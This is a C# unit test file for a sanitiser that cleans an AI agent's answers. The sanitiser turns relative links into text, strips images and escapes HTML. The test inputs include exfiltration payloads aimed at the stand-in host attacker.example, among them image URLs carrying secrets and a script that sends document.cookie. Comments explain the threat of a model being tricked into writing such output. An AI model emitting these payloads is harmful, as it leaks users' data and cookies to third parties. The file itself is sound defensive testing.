using GovUK.Dfe.AI.Agents.Quality;
using Xunit;

namespace GovUK.Dfe.AI.Agents.Tests.Quality;

/// <summary>Answers never carry links that would resolve against the app's own address and give a 404.</summary>
public sealed class AnswerLinksTests
{
    [Theory]
    [InlineData("Rated Good [Evidence 1](evidence/1).", "Rated Good [Evidence 1].")]          // a citation stays a citation
    [InlineData("See [Evidence 2](/evidence/2) and [Evidence 3](#3).", "See [Evidence 2] and [Evidence 3].")]
    [InlineData("Read [the report](files/report.pdf).", "Read the report.")]                   // other relative links become text
    [InlineData("On [GOV.UK](https://www.gov.uk/ofsted).", "On [GOV.UK](https://www.gov.uk/ofsted).")]   // full addresses are kept
    [InlineData("Email [us](mailto:team@education.gov.uk).", "Email [us](mailto:team@education.gov.uk).")]
    [InlineData("Plain [Evidence 1] citation.", "Plain [Evidence 1] citation.")]
    [InlineData("No links at all.", "No links at all.")]
    public void RelativeLinks_BecomeText_AndFullAddressesAreKept(string answer, string expected)
        => Assert.Equal(expected, AnswerLinks.Clean(answer));

    [Fact]
    public void NoAnswer_StaysNoAnswer()
        => Assert.Null(AnswerLinks.Clean(null));

    [Theory]
    // Images load without a click, so injected text could send data to another site: removed, keeping the alt text.
    [InlineData("Done ![chart](https://attacker.example/p?d=URN100000).", "Done chart.")]
    [InlineData("Done ![](https://attacker.example/p?d=secret).", "Done .")]
    [InlineData("Done <img src=\"https://attacker.example/p?d=secret\">.", "Done .")]
    [InlineData("Done <IMG SRC='https://attacker.example/x' alt='x'/>.", "Done .")]
    [InlineData("Logo ![DfE](https://www.gov.uk/logo.png) on [GOV.UK](https://www.gov.uk).", "Logo DfE on [GOV.UK](https://www.gov.uk).")]   // links stay
    public void Images_AreRemoved_KeepingTheirAltText(string answer, string expected)
        => Assert.Equal(expected, AnswerLinks.Clean(answer));

    [Theory]
    // An app that renders answers as HTML (e.g. for citation links) would otherwise run whatever the model was tricked into writing.
    [InlineData("Rated Good<script>fetch('https://attacker.example/?d='+document.cookie)</script>",
        "Rated Good&lt;script>fetch('https://attacker.example/?d='+document.cookie)&lt;/script>")]
    [InlineData("""See <a href="javascript:alert(1)">the report</a>.""", """See &lt;a href="javascript:alert(1)">the report&lt;/a>.""")]
    [InlineData("Hidden <!-- instruction --> text", "Hidden &lt;!-- instruction --> text")]
    [InlineData("<?xml version=\"1.0\"?>", "&lt;?xml version=\"1.0\"?>")]
    // Not HTML, so unchanged: a "<" before a space or digit, and Markdown.
    [InlineData("Attendance is < 90% and 3<5.", "Attendance is < 90% and 3<5.")]
    [InlineData("Rated **Good** in [2024](https://www.gov.uk/ofsted).", "Rated **Good** in [2024](https://www.gov.uk/ofsted).")]
    public void HtmlTheModelWrites_IsShownAsText_NotRun_AndTextThatIsntHtmlIsUnchanged(string answer, string expected)
        => Assert.Equal(expected, AnswerLinks.Clean(answer));
}
